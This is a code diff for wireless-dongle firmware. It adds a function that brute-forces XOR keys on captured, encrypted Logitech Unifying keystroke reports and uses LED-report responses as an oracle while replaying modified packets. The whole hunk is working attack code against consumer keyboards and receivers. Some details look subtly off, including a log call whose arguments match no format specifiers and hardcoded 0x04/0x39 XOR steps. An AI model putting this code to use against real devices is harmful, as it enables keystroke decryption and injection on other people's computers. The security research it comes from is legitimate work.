@@ -585,6 +585,68 @@ void process_next_replay_step(replay_event_t replay_event) {
     }
 }
 
+#define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_MOD 2
+#define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY1 3
+#define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY2 4
+#define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY3 5
+#define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY4 6
+#define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY5 7
+#define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY6 8
+
+void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
+    
+    unifying_rf_record_set_t * p_rs = &m_state_local.record_sets[pipe_num];
+    uint8_t start_pos = p_rs->first_pos;
+    uint8_t end_pos = p_rs->last_pos + 1;
+    if (end_pos >= UNIFYING_MAX_STORED_REPORTS_PER_PIPE) end_pos -= UNIFYING_MAX_STORED_REPORTS_PER_PIPE;
+    int read_length = start_pos < end_pos ? end_pos - start_pos : (end_pos + UNIFYING_MAX_STORED_REPORTS_PER_PIPE) - start_pos;
+
+    uint8_t next_xor_key = p_rs->XOR_key_for_LED_brute_force + 1;
+
+    NRF_LOG_INFO("Modifying reports for pipe %d with XOR key %02x", pipe_num, next_xor_key);
+
+    uint8_t with_led_count = 0;
+    for (uint8_t i = 0; i<read_length; i++) {
+        uint8_t read_pos = start_pos+i;
+        if (read_pos >= UNIFYING_MAX_STORED_REPORTS_PER_PIPE) read_pos -= UNIFYING_MAX_STORED_REPORTS_PER_PIPE;
+        unifying_rf_record_t * p_record = &p_rs->records[read_pos];
+
+        // if the record didn't result in LED report remove last XOR key and use new one
+        // (only for key down)
+        if (!p_record->isEncrytedKeyRelease) { // is key down
+            if (!p_record->resulted_in_LED_report) { // didn't result in LED report
+                uint8_t key1 = p_record->data[UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY1];
+                key1 ^= p_rs->XOR_key_for_LED_brute_force; // remove previous XOR key
+                key1 ^= next_xor_key; //apply new XOR key
+                key1 ^= 0x04; // remove previous XOR key
+                key1 ^= 0x39; //apply new XOR key
+                p_record->data[UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY1] = key1; // assign
+
+                // recalculate Logitech checksum
+                unifying_payload_update_checksum(p_record->data, p_record->length);
+                NRF_LOG_INFO("pos %d XOR modified", read_pos);
+            } else {
+                with_led_count++;
+                NRF_LOG_INFO("pos %d not XOR modified", read_pos);
+            }
+
+        }
+    }
+
+    if (with_led_count >= read_length/2) {
+        NRF_LOG_INFO("all key down records result in LED report, none modified", with_led_count, read_length/2);
+        p_rs->all_encrypted_reports_produce_LED_reports = true;
+    } else {
+        NRF_LOG_INFO("%d out of %d key down records result in LED report, rest has been modified", with_led_count, read_length/2);
+        p_rs->all_encrypted_reports_produce_LED_reports = false;
+    }
+    
+    
+
+    // advance XOR key
+    p_rs->XOR_key_for_LED_brute_force++;
+}
+
 // returns true if the given esb event was consumed by unifying module
 bool unifying_process_esb_event(nrf_esb_evt_t *p_event) {
     if (m_replay_state.running) {
